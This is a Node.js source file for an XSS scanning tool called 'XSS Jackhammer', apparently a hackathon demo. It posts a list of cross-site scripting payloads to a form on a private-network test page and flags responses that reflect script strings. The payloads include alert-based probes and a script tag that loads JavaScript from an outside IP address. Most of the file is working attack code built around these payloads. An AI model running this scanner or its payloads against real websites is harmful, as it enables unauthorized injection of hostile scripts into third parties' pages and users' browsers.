http = require('http')
jsdom = require('jsdom')
var art = require('ascii-art');
var request = require('request');
express = require('express')
app = express()
app.use(express.bodyParser())

//text
art.font('XSS Jackhammer', 'Doom', function(rendered){
    console.log(art.style(rendered, 'white_bg+bright_blue'));
});//text

list_search = ["script", "&lt;script", "<script"]
list_post = ["<script>alert('1')</script>", "<script src=//54.243.84.85/new_nyan.js></script>", "<img src=x onerror=alert(0)> "]


	var exploitStrings = ""
	var getUpdatedFunction = function(i1, list_post1, list_search1) {
			return function (error,response,body) {
			bVar = body;

			for (j=0;j<list_search1.length;j++)
			{
				idx=bVar.indexOf(list_search1[j])

				if (idx != -1)  {
				console.log("Flagged: " + list_search1[j])
				
				 }
			}
			
			}
		}


		//loop searches 
	bVar = ""
	var arrayLength = list_post.length;
	form = ""
	jsdom.env(
	  'http://10.31.64.152:8888/HackbcaDemo.php/exploit', //change back to 'url'
	  ["http://code.jquery.com/jquery.js"],
	  function (errors, window) {
//		console.log(window.$("form")[0].action);
		console.log("Load URL: http://10.31.64.152:8888/HackbcaDemo.php/exploit")

		console.log("Exploits Loaded: " + arrayLength);


		
			// DEBUG: console.log("Array length " + arrayLength);
			for (i=0;i<arrayLength;i++){
			

			request.post("http://10.31.64.152:8888/HackbcaDemo.php/exploit?xss=",{form: {xss2:list_post[i]}},getUpdatedFunction(i,list_post,list_search))
			console.log("Try: http://10.31.64.152:8888/HackbcaDemo.php/exploit?xss=" + list_post[i])
		}
		}
			
   	 

	  
	);


app.get("/", function(req, res) {
	
	res.end('<html><form action="/submit" method="POST">Target Site: <input name="http://10.31.64.152:8888/HackbcaDemo.php/exploit" /><button>PWN</button></form></html>');
});

var server = app.listen(3000, function() {
    console.log('Listening on port %d', server.address().port);
});